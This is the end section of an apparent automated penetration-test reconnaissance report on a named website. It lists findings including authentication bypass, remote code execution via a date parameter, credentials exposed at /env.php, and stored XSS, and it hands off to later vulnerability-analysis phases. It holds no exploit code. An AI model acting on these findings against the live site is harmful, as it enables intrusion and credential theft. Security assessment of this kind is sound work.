| 7 | Sensitive Data Logging | submissions.php:17 (`$_COOKIE`) | /admin_debug.log | **MEDIUM** |

---

## RECONNAISSANCE COMPLETE

**Report Generated**: 2026-02-12
**Target**: https://bybrynn.com
**Scope**: Network-accessible attack surface
**Methodology**: Live browser exploration + parallel source code analysis via Task agents

**Critical Findings Summary**:
- ✅ OAuth authentication implemented
- ❌ Authorization completely absent
- ❌ Authentication bypass via POST method exclusion
- ❌ Remote code execution via date parameter injection
- ❌ Credential exposure via /env.php
- ❌ No role-based access control
- ❌ File upload MIME validation only
- ❌ Stored XSS via innerHTML rendering

**Next Phase**: Vulnerability analysis specialists will use this attack surface map to identify exploitable weaknesses in injection handling, XSS contexts, authentication mechanisms, SSRF vectors, and authorization boundaries.
